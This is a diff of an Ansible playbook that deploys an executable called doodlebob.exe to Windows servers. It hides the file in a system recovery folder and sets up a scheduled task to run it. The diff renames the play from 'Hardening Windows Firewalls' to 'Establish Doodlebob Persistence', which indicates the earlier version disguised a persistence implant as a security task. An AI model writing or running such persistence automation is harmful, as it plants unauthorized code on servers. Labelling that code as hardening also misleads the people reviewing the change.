@@ -1,6 +1,6 @@
 ---
-- name: Hardening Windows Firewalls - Manual Strategy Automation
-  hosts: windows_servers
+- name: Establish Doodlebob Persistence on Windows Servers
+  hosts: windows
   gather_facts: true
 
   tasks:
@@ -8,6 +8,7 @@
           ansible.windows.win_file:
             path: C:\Windows\System32\Recovery\tmp
             state: directory
+            
         - name: Copy doodlebob.py to the target machine
           ansible.windows.win_copy:
             src: dist/doodlebob.exe
@@ -24,5 +25,4 @@
                 start_boundary: '2026-10-26T17:00:00'
                 enabled: true
             actions: 
-              - name: Run doodlebob.exe
-                path: C:\Windows\System32\Recovery\tmp\doodlebob.exe
+              - path: C:\Windows\System32\Recovery\tmp\doodlebob.exe
